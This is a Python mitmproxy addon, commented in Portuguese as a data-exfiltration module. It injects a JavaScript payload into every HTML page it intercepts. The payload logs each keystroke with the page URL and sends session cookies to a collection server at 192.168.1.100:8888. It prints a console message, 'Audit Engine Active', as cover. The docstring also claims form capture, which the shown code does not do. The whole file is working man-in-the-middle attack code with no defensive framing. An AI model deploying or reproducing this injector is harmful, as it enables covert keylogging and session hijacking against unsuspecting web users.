#!/usr/bin/env python3
"""
JS INJECTOR MITM - MÓDULO DE EXFILTRAÇÃO DE DADOS
------------------------------------------------
Este script atua como uma extensão do mitmproxy para injetar JavaScript
em todas as páginas HTML visitadas pelo usuário.

O script injetado captura:
1. Teclas digitadas (Keylogging)
2. Cookies de sessão
3. Conteúdo de formulários antes do envio
"""

from mitmproxy import http
import logging

# Payload JavaScript de Elite (Minificado para eficiência)
# Este script envia os dados capturados de volta para o nosso servidor de logs
JS_PAYLOAD = """
<script>
(function() {
    var server = 'http://192.168.1.100:8888/log';
    document.addEventListener('keypress', function(e) {
        fetch(server + '?key=' + e.key + '&url=' + window.location.href);
    });
    console.log('Audit Engine Active');
    // Capturar cookies
    fetch(server + '?cookie=' + document.cookie);
})();
</script>
"""

class JSInjector:
    def response(self, flow: http.HTTPFlow) -> None:
        """Injeta o payload no final da tag <head> de cada página HTML"""
        if "text/html" in flow.response.headers.get("Content-Type", ""):
            html = flow.response.get_text()
            if "<head>" in html:
                flow.response.set_text(html.replace("<head>", "<head>" + JS_PAYLOAD))
                logging.info(f"[INJECTION] Payload injetado em: {flow.request.pretty_url}")

addons = [
    JSInjector()
]
